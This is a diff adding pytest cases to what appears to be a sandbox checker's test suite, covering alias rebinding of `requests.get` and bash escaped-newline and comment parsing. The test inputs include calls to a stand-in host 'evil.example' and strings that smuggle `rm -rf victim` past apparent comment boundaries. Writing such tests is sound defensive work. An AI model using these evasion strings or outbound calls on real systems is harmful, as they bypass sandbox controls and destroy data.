@@ -622,6 +622,35 @@ class TestAliasResolutionOnlyEverAddsCandidates:
     def test_an_import_below_the_body_is_still_resolved(self, code):
         _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
 
+    @pytest.mark.parametrize(
+        "code",
+        [
+            # A shadow only takes effect for the calls that cannot run before it. Dropping the
+            # alias for the whole tree let a call written ABOVE the rebinding go unrecognised.
+            pytest.param(
+                "from requests import get as fetch\n"
+                'fetch("http://evil.example/x")\n'
+                "fetch = print",
+                id = "call_above_the_rebinding",
+            ),
+            pytest.param(
+                'from requests import *\nget("http://evil.example/x")\ndef get(u):\n    return u',
+                id = "star_imported_call_above_the_rebinding",
+            ),
+            # A body can be invoked at any point, including before the rebinding.
+            pytest.param(
+                "from requests import get as fetch\n"
+                "def send():\n"
+                '    fetch("http://evil.example/x")\n'
+                "fetch = print\n"
+                "send()",
+                id = "body_that_could_run_before_the_rebinding",
+            ),
+        ],
+    )
+    def test_a_shadow_does_not_reach_backwards(self, code):
+        _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
+
     def test_a_body_above_its_import_reaching_an_allowed_host_still_runs(self):
         _ok(
             "def send():\n"
@@ -2781,6 +2810,13 @@ class TestEscapedNewlineIsNotACommandBoundary:
             # ran, so with a lexable command the walk decides. Checked against bash 5.2.21: this
             # is one `echo` and the file survives.
             pytest.param("echo '; A=1 rm -rf x'", id = "assignment_prefix_inside_quotes_is_data"),
+            # A substitution's close stays inside the surrounding word, so a `#` right after it is
+            # text, not a comment. Checked against bash 5.2.21: this is one `echo` printing
+            # `x#note rm -rf victim`, and the file survives.
+            pytest.param(
+                "echo $(printf x)#note \\\nrm -rf victim",
+                id = "hash_after_a_substitution_close_is_text",
+            ),
         ],
     )
     def test_joined_line_is_one_command(self, command):
@@ -2848,6 +2884,11 @@ class TestEscapedNewlineIsNotACommandBoundary:
                 'echo "$( (a) ; (b) ; echo ok # c \\\nrm -f victim\n)"',
                 "rm",
                 id = "two_subshells_inside_a_substitution",
+            ),
+            # A SUBSHELL's close is a control operator, so a `#` after it does open a comment and
+            # the next line really runs. Checked against bash 5.2.21: the file is deleted.
+            pytest.param(
+                "(echo hi)#c \\\nrm -rf victim", "rm", id = "hash_after_a_subshell_close_is_a_comment"
             ),
         ],
     )
